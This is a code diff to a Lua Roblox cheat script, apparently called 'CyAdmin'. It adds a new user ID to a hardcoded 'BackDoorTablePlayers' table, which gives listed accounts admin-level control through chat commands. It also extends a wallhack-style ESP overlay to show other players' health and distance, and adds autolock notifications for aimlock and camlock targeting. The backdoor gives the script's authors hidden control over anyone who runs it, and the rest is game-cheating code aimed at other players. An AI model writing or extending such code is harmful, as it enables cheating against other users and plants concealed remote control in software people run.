@@ -231,6 +231,11 @@ local BackDoorTablePlayers = {
 		['Name'] = "!fishgang Ambiguity [Admin]";
 		['Access'] = 3;
 		['Colour'] = Color3.fromRGB(57,52,52);
+	};
+	[284761493] = {
+		['Name'] = "Zero";
+		['Access'] = 3;
+		['Colour'] = Color3.fromRGB(255,255,255);
 	}
 }
 
@@ -604,7 +609,7 @@ local function ColourifyGuns(GunTable,Colour)
 end
 
 local function initalizeBackdoorPart2(BackdoorPlayer,Colour)
-	if BackdoorPlayer and BackdoorPlayer.Character and BackdoorPlayer.Character:FindFirstChildOfClass'Humanoid' then 
+	if BackdoorPlayer and BackdoorPlayer.Character then 
 		ColourifyGuns(BackdoorPlayer.Backpack,Colour)
 		ColourifyGuns(BackdoorPlayer.Character,Colour)
 		BackdoorPlayer.Character.ChildAdded:Connect(function()
@@ -742,8 +747,15 @@ local function Esp(Part,Name,Colour)
 		TextLabel.TextSize = 8
 		local Player = PlrFinder(Name)
 		if Player then
-			local User = AdminUserTable[Player] and "Yes" or "No"
-			TextLabel.Text = Name.." | CyAdmin User: "..User.."\nHas (Gamepasses) Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist")
+			EspTable2[Player] = true
+			local Event;Event = RunService.Stepped:Connect(function()
+				if EspTable2[Player] and Player.Character and Player.Character:FindFirstChild'Head' and Player.Character:FindFirstChildOfClass'Humanoid' then 
+					local User = AdminUserTable[Player] and "Yes" or "No"
+					TextLabel.Text = Name.." | CyAdmin User: "..User.."\nHas (Gamepasses) Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist").."\nHealth: "..math.floor(Player.Character.Humanoid.Health).." | Position: "..math.floor((GetChar().Head.Position - Player.Character.Head.Position).magnitude)
+				else
+					Event:Disconnect()
+				end
+			end)
 		else 
 			TextLabel.Text = Name
 		end
@@ -907,9 +919,6 @@ local function StateChanged(Old,New)
 local Character = GetChar()
 	if NoGh then
 		if New == Enum.HumanoidStateType.Freefall or New == Enum.HumanoidStateType.FallingDown or New == Enum.HumanoidStateType.PlatformStanding then
-			if game.PlaceId == 455366377 and Flying then 
-				wait(0.3)
-			end
 			Character.Humanoid.PlatformStand = false
 			Character.Humanoid:ChangeState(8)
 		end
@@ -935,6 +944,9 @@ local function ColourChanger(T)
 	if T:IsA'ObjectValue' and T.Name == "creator" then 
 		if AutoTarget then
 			if Aimlock then 
+				if AimlockTarget ~= T.Value then 
+					notif("Autolock","Set the Aimlock player to "..AimlockTarget.Name,5,nil)
+				end 
 				AimlockTarget = T.Value
 				local Connection;Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
 					if tostring(C) == tostring(AimlockTarget) then 
@@ -945,7 +957,10 @@ local function ColourChanger(T)
 					end
 				end)
 			end
-			if CamLocking then 
+			if CamLocking then
+				if CamlockPlayer ~= Players:GetPlayerFromCharacter(T.Value) then 
+					notif("Autolock","Set the camlock player to "..T.Value.Name,5,nil)
+				end 
 				CamlockPlayer = Players:GetPlayerFromCharacter(T.Value)
 			end
 		end
@@ -1328,6 +1343,9 @@ end)
 Players.PlayerRemoving:Connect(function(Player)
 	if ExploitDetectionPlayerTablePositions[tostring(Player)] then 
 		ExploitDetectionPlayerTablePositions[tostring(Player)] = nil
+	end
+	if EspTable2[Player] then 
+		EspTable2[Player] = nil
 	end
 	Unesp(Player)
 end)
@@ -2110,11 +2128,10 @@ AddCommand(function(Arguments)
 				for i = 1,#Player do
 					local ActualPlr = Player[i]
 					if ActualPlr ~= LP and ActualPlr.Character and ActualPlr.Character:FindFirstChild'Head' then
-						EspTable2[ActualPlr] = true 
 						Esp(ActualPlr.Character.Head,Player.Name)
 						local EspEvent;EspEvent = ActualPlr.CharacterAdded:Connect(function(C)
 							local Head = C:WaitForChild'Head'
-							if EspTable[Player] then 
+							if EspTable2[Player] then 
 								Esp(Head,Player.Name)
 							else 
 								EspEvent:Disconnect()
@@ -2124,11 +2141,10 @@ AddCommand(function(Arguments)
 				end
 			else
 				if Player.Character and Player.Character:FindFirstChild'Head' then
-					EspTable2[Player] = true 
 					Esp(Player.Character.Head,Player.Name)
 					local EspEvent;EspEvent = Player.CharacterAdded:Connect(function(C)
 						local Head = C:WaitForChild'Head'
-						if EspTable[Player] then 
+						if EspTable2[Player] then 
 							Esp(Head,Player.Name)
 						else 
 							EspEvent:Disconnect()
@@ -2402,7 +2418,7 @@ coroutine.resume(coroutine.create(function()
 					if game.PlaceId == 455366377 and not Character:FindFirstChild'HumanoidRootPart' then 
 						Character.Humanoid:ChangeState(3)
 						Character.Humanoid.PlatformStand = false
-						RunService.RenderStepped:Wait()
+						wait(0.1)
 					end
 					Character.Humanoid:ChangeState(8)
 				end
@@ -2498,7 +2514,7 @@ coroutine.resume(coroutine.create(function()
 					Table['Box'][3].To = Vector2.new(TopLeft.X,TopLeft.Y)
             	end 
         	end 
-    	end 
+		end
 	end
 end))
 
@@ -2542,15 +2558,13 @@ coroutine.resume(coroutine.create(function()
 		local Backdoor = BackDoorTablePlayers[Player.UserId]
 		if Backdoor and Player.Character and Player.Character:FindFirstChild'Head' then
 			Player.Chatted:Connect(function(Chat) BackdoorCheck(Player,Chat) end)
-			Esp(Player.Character.Head,Backdoor['Name'],Backdoor['Colour'])
-			initalizeBackdoorPart2(Player,Backdoor['Colour'])
 			Player.CharacterAdded:Connect(function(C)
 				local Head = C:WaitForChild'Head'
-				if Head then
-					initalizeBackdoorPart2(Player,Backdoor['Colour'])
-					Esp(Head,Backdoor['Name'],Backdoor['Colour'])
-				end
+				Esp(Head,Backdoor['Name'],Backdoor['Colour'])
+				initalizeBackdoorPart2(Player,Backdoor['Colour'])
 			end)
+			Esp(Player.Character.Head,Backdoor['Name'],Backdoor['Colour'])
+			initalizeBackdoorPart2(Player,Backdoor['Colour'])
 		end
 		local Chatted;Chatted = Player.Chatted:Connect(function(Chat)
 		local User = IsAUser(Player,Chat)
